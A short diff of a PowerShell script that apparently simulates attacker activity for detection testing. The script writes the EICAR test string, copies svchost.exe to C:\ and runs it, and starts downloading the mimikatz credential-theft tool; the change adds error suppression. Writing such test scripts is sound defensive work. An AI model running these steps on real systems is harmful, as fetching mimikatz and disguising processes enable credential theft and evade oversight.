@@ -1,3 +1,6 @@
+# Ignore errors
+$ErrorActionPreference = 'SilentlyContinue'
+
 # Create file with malware test content
 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | Out-File EICAR.com
 
@@ -6,7 +9,6 @@ Copy-Item -Path C:\Windows\System32\svchost.exe C:\
 C:\svchost.exe
 
 # Download and expand mimikatz
-mkdir c:\install
 cd c:\install
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
 $WebClient = New-Object System.Net.WebClient
